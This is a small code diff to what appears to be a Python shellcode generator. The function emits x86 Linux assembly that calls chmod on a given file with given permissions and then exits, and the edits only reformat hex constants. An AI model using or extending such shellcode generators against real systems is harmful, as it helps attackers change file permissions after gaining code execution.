@@ -14,7 +14,6 @@ def run(file_to_perm,perm_num):
 			perm_num = perm_num.replace('0x','0x0')
 		if len(perm_num) is 10:
 			perm_num = perm_num + '\npop %ecx\n'
-
 		if len(perm_num) is 8:
 			perm_num = perm_num + '90\npop %ecx\nshr $0x8,%ecx\n'
 		if len(perm_num) is 6:
@@ -101,14 +100,14 @@ def run(file_to_perm,perm_num):
 	
 	
 	
-	shellcode = '''push   $0xf
+	shellcode = '''push   $0x0f
 pop    %%eax
 %s
 %s
 mov    %%esp,%%ebx
 int    $0x80
-mov    $0x1,%%al
-mov    $0x1,%%bl
+mov    $0x01,%%al
+mov    $0x01,%%bl
 int    $0x80'''%(perm_num,file_z)
 	return shellcode
 
